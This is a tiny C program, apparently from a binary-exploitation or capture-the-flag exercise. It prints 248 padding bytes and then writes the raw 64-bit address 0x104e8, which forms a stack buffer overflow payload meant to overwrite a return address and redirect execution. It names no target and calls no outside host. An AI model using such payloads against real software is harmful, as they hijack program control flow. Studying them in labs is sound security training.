#include <stdio.h>
#include <string.h>
#include <stdint.h>

int main(){
    for(int i =0;i<248;i++){
        printf("a");
    }
    uint64_t target_addr = 0x104e8;
    fwrite(&target_addr, sizeof(uint64_t), 1, stdout);

}